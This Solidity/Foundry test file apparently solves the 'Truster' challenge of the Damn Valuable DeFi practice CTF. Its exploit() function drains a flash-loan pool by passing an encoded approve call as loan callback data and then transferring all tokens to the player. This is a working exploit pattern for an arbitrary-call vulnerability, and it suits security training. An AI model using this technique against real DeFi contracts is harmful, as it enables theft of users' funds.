// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/truster/TrusterLenderPool.sol";
import "../../src/DamnValuableToken.sol";

contract TrusterTest is Test {
    address public deployer;
    address public player;

    TrusterLenderPool public pool;
    DamnValuableToken public token;

    uint256 public constant TOKENS_IN_POOL = 1_000_000 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");

        vm.startPrank(deployer);

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        assertEq(address(pool.token()), address(token));
        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);

        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);

        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, amount);
        pool.flashLoan(0, player, address(token), data);
        token.transferFrom(address(pool), player, amount);

        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
